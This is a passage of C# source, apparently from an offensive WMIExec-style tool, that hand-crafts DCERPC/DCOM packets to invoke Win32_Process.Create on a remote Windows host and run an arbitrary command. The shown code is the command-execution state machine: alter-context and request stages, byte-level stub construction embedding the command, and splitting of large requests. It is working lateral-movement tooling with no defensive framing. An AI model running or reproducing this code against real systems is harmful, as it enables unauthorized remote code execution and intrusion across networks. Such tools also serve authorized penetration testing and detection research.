                            output.AppendLine("An Unkonwn Error Occured");
                            return output.ToString();
                        }

                        //Moving on to Command Execution
                        int request_split_index = 5500;
                        string WMI_client_stage_next = "";
                        bool request_split = false;

                        while (WMI_client_stage != "exit")
                        {
                            if (debug) { output.AppendLine(WMI_client_stage); }
                            if (WMI_client_receive[2] == 3)
                            {
                                string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                                string[] error_code_array = error_code.Split('-');
                                error_code = string.Join("", error_code_array);
                                output.AppendLine(String.Format("Execution failed with error code: 0x{0}", error_code.ToString()));
                                WMI_client_stage = "exit";
                            }

                            switch (WMI_client_stage)
                            {
                                case "AlterContext":
                                    {
                                        switch (sequence_number[0])
                                        {
                                            case 0:
                                                {
                                                    alter_context_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x02, 0x00 };
                                                    alter_context_UUID = new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
                                                    WMI_client_stage_next = "Request";
                                                }
                                                break;
                                            case 1:
                                                {
                                                    alter_context_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x03, 0x00 };
                                                    alter_context_UUID = new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
                                                    WMI_client_stage_next = "Request";
                                                }
                                                break;
                                            case 6:
                                                {
                                                    alter_context_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    alter_context_context_ID = new byte[] { 0x04, 0x00 };
                                                    alter_context_UUID = new byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
                                                    WMI_client_stage_next = "Request";
                                                }
                                                break;
                                        }
                                        packet_RPC = WMIExec.RPCAlterContext(assoc_group, alter_context_call_ID, alter_context_context_ID, alter_context_UUID);
                                        WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC);
                                        WMI_client_receive = SendStream(WMI_client_random_port_stream, WMI_client_send);
                                        WMI_client_stage = WMI_client_stage_next;
                                    }
                                    break;
                                case "Request":
                                    {
                                        switch (sequence_number[0])
                                        {
                                            case 0:
                                                {
                                                    sequence_number = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 12;
                                                    request_call_ID = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x02, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID2;
                                                    hostname_length = BitConverter.GetBytes(auth_hostname.Length + 1);
                                                    WMI_client_stage_next = "AlterContext";

                                                    if (Convert.ToBoolean(auth_hostname.Length % 2))
                                                    {
                                                        auth_hostname_bytes = auth_hostname_bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                                                    }
                                                    else
                                                    {
                                                        auth_hostname_bytes = auth_hostname_bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                    }

                                                    stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(causality_ID_bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                        .Concat(hostname_length)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(hostname_length)
                                                        .Concat(auth_hostname_bytes)
                                                        .Concat(process_ID_Bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 1:
                                                {
                                                    sequence_number = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 8;
                                                    request_call_ID = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x03, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = IPID;
                                                    WMI_client_stage_next = "Request";
                                                    stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(causality_ID_bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 2:
                                                {
                                                    sequence_number = new byte[] { 0x03, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_call_ID = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x03, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID;
                                                    WMI_namespace_length = BitConverter.GetBytes(target_short.Length + 14);
                                                    WMI_namespace_unicode = Encoding.Unicode.GetBytes("\\\\" + target_short + "\\root\\cimv2");
                                                    WMI_client_stage_next = "Request";

                                                    if (Convert.ToBoolean(target_short.Length % 2))
                                                    {
                                                        WMI_namespace_unicode = WMI_namespace_unicode.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                    }
                                                    else
                                                    {
                                                        WMI_namespace_unicode = WMI_namespace_unicode.Concat(new byte[] { 0x00, 0x0 }).ToArray();

                                                    }

                                                    stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(causality_ID_bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                        .Concat(WMI_namespace_length)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(WMI_namespace_length)
                                                        .Concat(WMI_namespace_unicode)
                                                        .Concat(new byte[] { 0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x2d, 0x00, 0x55, 0x00, 0x53, 0x00, 0x2c, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                   
                                                }
                                                break;
                                            case 3:
                                                {
                                                    sequence_number = new byte[] { 0x04, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 8;
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_call_ID = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x05, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "Request";
                                                    WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                                                    OXID_index = WMI_data.IndexOf(OXID);
                                                    OXID_bytes_index = OXID_index / 2;
                                                    IPID2 = Utilities.GetByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                                                    OrderedDictionary packet_rem_release = WMIExec.DCOMRemRelease(causality_ID_bytes, object_UUID2, IPID);
                                                    stub_data = Utilities.ConvertFromPacketOrderedDictionary(packet_rem_release);
                                                }
                                                break;
                                            case 4:
                                                {
                                                    sequence_number = new byte[] { 0x05, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 4;
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_call_ID = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "Request";
                                                    packet_rem_query_interface = WMIExec.DCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x9e, 0xc1, 0xfc, 0xc3, 0x70, 0xa9, 0xd2, 0x11, 0x8b, 0x5a, 0x00, 0xa0, 0xc9, 0xb7, 0xc9, 0xc4 });
                                                    stub_data = Utilities.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);


                                                }
                                                break;
                                            case 5:
                                                {
                                                    sequence_number = new byte[] { 0x06, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 4;
                                                    request_call_ID = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    request_context_ID = new byte[] { 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x03, 0x00 };
                                                    request_UUID = object_UUID;
                                                    WMI_client_stage_next = "AlterContext";
                                                    packet_rem_query_interface = WMIExec.DCOMRemQueryInterface(causality_ID_bytes, IPID2, new byte[] { 0x83, 0xb2, 0x96, 0xb1, 0xb4, 0xba, 0x1a, 0x10, 0xb6, 0x9c, 0x00, 0xaa, 0x00, 0x34, 0x1d, 0x07 });
                                                    stub_data = Utilities.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                                                }
                                                break;
                                            case 6:
                                                {
                                                    sequence_number = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_context_ID = new byte[] { 0x04, 0x00 };
                                                    request_call_ID = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID2;
                                                    WMI_client_stage_next = "Request";

                                                    stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(causality_ID_bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            case 7:
                                                {
                                                    sequence_number = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                    request_flags = new byte[] { 0x83 };
                                                    request_auth_padding = 0;
                                                    request_context_ID = new byte[] { 0x04, 0x00 };
                                                    request_call_ID = new byte[] { 0x10, 0x00, 0x00, 0x00 };
                                                    request_opnum = new byte[] { 0x06, 0x00 };
                                                    request_UUID = IPID2;
                                                    WMI_client_stage_next = "Request";

                                                    stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                        .Concat(causality_ID_bytes)
                                                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x70, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                }
                                                break;
                                            default:
                                                {
                                                    if (sequence_number[0] >= 8)
                                                    {
                                                        sequence_number = new byte[] { 0x09, 0x00, 0x00, 0x00 };
                                                        request_auth_padding = 0;
                                                        request_context_ID = new byte[] { 0x04, 0x00 };
                                                        request_call_ID = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                        request_opnum = new byte[] { 0x18, 0x00 };
                                                        request_UUID = IPID2;
                                                        byte[] stub_length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1769), 0, 1);
                                                        byte[] stub_length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1727), 0, 1); ;
                                                        byte[] stub_length3 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1713), 0, 1);
                                                        byte[] command_length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 93), 0, 1);
                                                        byte[] command_length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 16), 0, 1);
                                                        byte[] command_bytes = Encoding.UTF8.GetBytes(command);

                                                        string command_padding_check = Convert.ToString(Decimal.Divide(command.Length, 4));
                                                        if (command_padding_check.Contains(".75"))
                                                        {
                                                            command_bytes = command_bytes.Concat(new byte[] { 0x00 }).ToArray();
                                                        }
                                                        else if (command_padding_check.Contains(".5"))
                                                        {
                                                            command_bytes = command_bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                                                        }
                                                        else if (command_padding_check.Contains(".25"))
                                                        {
                                                            command_bytes = command_bytes.Concat(new byte[] { 0x00, 0x00, 0x00 }).ToArray();
                                                        }
                                                        else
                                                        {
                                                            command_bytes = command_bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                                        }

                                                        Console.WriteLine("big stub");
                                                        stub_data = (new byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                                                            .Concat(causality_ID_bytes)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x0d, 0x00, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5f, 0x00, 0x50, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x06, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x63, 0x00, 0x72, 0x00, 0x65, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00 })
                                                            .Concat(stub_length)
                                                            .Concat(new byte[] { 0x00, 0x00})
                                                            .Concat(stub_length)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0x81, 0xa6, 0x12, 0xdc, 0x7f, 0x73, 0xcf, 0x11, 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x12, 0xf8, 0x90, 0x45, 0x3a, 0x1d, 0xd0, 0x11, 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24, 0x00, 0x00, 0x00, 0x00 })
                                                            .Concat(stub_length2)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x78, 0x56, 0x34, 0x12 })
                                                            .Concat(stub_length3)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x02, 0x53, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x03, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x00, 0x00, 0x15, 0x01, 0x00, 0x00, 0x73, 0x01, 0x00, 0x00, 0x76, 0x02, 0x00, 0x00, 0xd4, 0x02, 0x00, 0x00, 0xb1, 0x03, 0x00, 0x00, 0x15, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x12, 0x04, 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00, 0x61, 0x62, 0x73, 0x74, 0x72, 0x61, 0x63, 0x74, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x4c, 0x69, 0x6e, 0x65, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x59, 0x01, 0x00, 0x00, 0x5e, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0xca, 0x00, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x11, 0x01, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0xe2, 0x01, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x41, 0x50, 0x49, 0x7c, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x46, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x7c, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x7c, 0x6c, 0x70, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0x85, 0x01, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xba, 0x02, 0x00, 0x00, 0xac, 0x01, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x2b, 0x02, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0xda, 0x01, 0x00, 0x00, 0x72, 0x02, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x57, 0x4d, 0x49, 0x7c, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x00, 0x4d, 0x61, 0x70, 0x70, 0x69, 0x6e, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xef, 0x02, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x02, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0x00, 0x49, 0x44, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x80, 0x03, 0x08, 0x00, 0x00, 0x00, 0xf5, 0x03, 0x00, 0x00, 0x16, 0x03, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0xff, 0xff, 0x66, 0x03, 0x00, 0x00, 0x02, 0x08, 0x20, 0x00, 0x00, 0x44, 0x03, 0x00, 0x00, 0xad, 0x03, 0x00, 0x00, 0x11, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3a, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70 })
                                                            .Concat(new byte[501])
                                                            .Concat(command_length)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01 })
                                                            .Concat(command_length2)
                                                            .Concat(new byte[] { 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00 })
                                                            .Concat(command_bytes)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
    
                                                        if (stub_data.Length < request_split_index)
                                                        {
                                                            request_flags = new byte[] { 0x83 };
                                                            WMI_client_stage_next = "Result";
                                                        }
                                                        else
                                                        {
                                                            request_split = true;
                                                            double request_split_stage_final = Math.Ceiling((double)stub_data.Length / request_split_index);
                                                            if (request_split_stage < 2)
                                                            {
                                                                request_length = stub_data.Length;
                                                                stub_data = Utilities.GetByteRange(stub_data, 0, request_split_index - 1);
                                                                request_split_stage = 2;
                                                                sequence_number_counter = 10;
                                                                request_flags = new byte[] { 0x81 };
                                                                request_split_index_tracker = request_split_index;
                                                                WMI_client_stage_next = "Request";
                                                            }
                                                            else if (request_split_stage == request_split_stage_final)
                                                            {
                                                                request_split = false;
                                                                sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                request_split_stage = 0;
                                                                stub_data = Utilities.GetByteRange(stub_data, request_split_index_tracker, stub_data.Length);
                                                                request_flags = new byte[] { 0x82 };
                                                                WMI_client_stage_next = "Result";
                                                            }
                                                            else
                                                            {
                                                                request_length = stub_data.Length - request_split_index_tracker;
                                                                stub_data = Utilities.GetByteRange(stub_data, request_split_index_tracker, request_split_index_tracker + request_split_index - 1);
